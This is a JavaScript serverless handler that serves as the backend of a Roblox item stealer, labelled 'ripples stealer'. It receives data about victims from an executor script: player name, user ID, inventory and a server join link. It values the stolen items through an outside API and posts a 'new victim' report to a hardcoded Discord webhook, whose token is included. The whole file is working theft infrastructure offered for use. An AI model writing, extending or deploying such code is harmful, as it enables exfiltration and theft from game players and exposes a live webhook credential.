export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Your Discord webhook
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1527495334006227006/Y31eTLFRCdt6F1dhvhDLKzAvplLx8iX_mH1HdyVJ44n01esSCpuLFuepWySKqTNz-esD";

    // Fetch values from your getvalues.js API
    let itemValues = {};
    try {
        const valuesResponse = await fetch('https://my-api-dusky-three.vercel.app/api/getvalues.js');
        if (valuesResponse.ok) {
            itemValues = await valuesResponse.json();
            console.log('✅ Loaded values from API');
        }
    } catch (error) {
        console.error('Failed to fetch values:', error);
    }
    
    const getValue = (name) => {
        if (itemValues[name]) return itemValues[name];
        if (itemValues[name.replace(/^[Cc]hroma /, '')]) return itemValues[name.replace(/^[Cc]hroma /, '')];
        if (name && name.includes("Chroma")) return 1000;
        if (name && (name.includes("Celestial") || name.includes("Ice"))) return 100;
        return 1;
    };
    
    try {
        const { hitData } = req.body;
        
        if (!hitData) {
            // Forward regular message
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(req.body)
            });
            return res.status(200).json({ success: true });
        }
        
        // Process hit data with values
        const { player, userId, jobId, items, joinLink } = hitData;
        
        let totalValue = 0;
        let chromaCount = 0;
        let ancientCount = 0;
        let godlyCount = 0;
        let processedItems = [];
        
        for (const item of items) {
            let value = getValue(item.name);
            totalValue = totalValue + (value * item.amount);
            
            if (item.name.includes("Chroma")) chromaCount += item.amount;
            else if (item.name.includes("Celestial") || item.name.includes("Ice") || item.name.includes("Traveler") || item.name.includes("Vampire")) ancientCount += item.amount;
            else if (item.name.includes("Candy") || item.name.includes("Sugar") || item.name.includes("Sweet") || item.name.includes("Treat")) godlyCount += item.amount;
            
            let emoji = "🔪";
            if (item.name.includes("Chroma")) emoji = "🌈";
            else if (item.name.includes("Celestial")) emoji = "⭐";
            else if (item.name.includes("Candy")) emoji = "🍬";
            
            processedItems.push({
                name: item.name,
                amount: item.amount,
                value: value,
                emoji: emoji
            });
        }
        
        processedItems.sort((a, b) => b.value - a.value);
        
        let itemsText = "";
        for (let i = 0; i < Math.min(processedItems.length, 20); i++) {
            const item = processedItems[i];
            itemsText += `   ${item.emoji} ${item.name} x${item.amount} (💎 ${item.value})\n`;
        }
        if (processedItems.length > 20) {
            itemsText += `\n✨ +${processedItems.length - 20} more items`;
        }
        
        let rarityText = "";
        if (chromaCount > 0) rarityText += `🌈 Chroma: ${chromaCount}  `;
        if (ancientCount > 0) rarityText += `⭐ Ancient: ${ancientCount}  `;
        if (godlyCount > 0) rarityText += `🍬 Godly: ${godlyCount}  `;
        if (rarityText === "") rarityText = "🔪 No rare items";
        
        const embed = {
            title: "🎀 ˚₊‧꒰ა 𝐧𝐞𝐰 𝐯𝐢𝐜𝐭𝐢𝐦 ໒꒱ ‧₊˚ 🎀",
            color: 0xFFB6C1,
            thumbnail: { url: "https://cdn.discordapp.com/attachments/1506677934033735760/1506681204861177866/IMG_3526.jpg" },
            fields: [
                { name: "👤 𝐩𝐥𝐚𝐲𝐞𝐫", value: player, inline: true },
                { name: "🆔 𝐮𝐬𝐞𝐫 𝐢𝐝", value: userId.toString(), inline: true },
                { name: "💻 𝐞𝐱𝐞𝐜𝐮𝐭𝐨𝐫", value: "Delta", inline: true },
                { name: "📊 𝐫𝐚𝐫𝐢𝐭𝐲", value: rarityText, inline: false },
                { name: "💰 𝐭𝐨𝐭𝐚𝐥", value: `💎 ${totalValue}`, inline: false },
                { name: "📦 𝐢𝐭𝐞𝐦𝐬", value: `\`\`\`\n${itemsText}\n\`\`\``, inline: false },
                { name: "🎮 𝐣𝐨𝐢𝐧", value: `[𝐜𝐥𝐢𝐜𝐤 𝐭𝐨 𝐣𝐨𝐢𝐧](${joinLink})`, inline: false }
            ],
            footer: { text: "♡₊˚ ripples stealer ˚₊♡" },
            timestamp: new Date().toISOString()
        };
        
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed], username: "ripples" })
        });
        
        return res.status(200).json({ success: true });
        
    } catch (error) {
        console.error('Proxy error:', error);
        return res.status(500).json({ error: 'Failed' });
    }
}
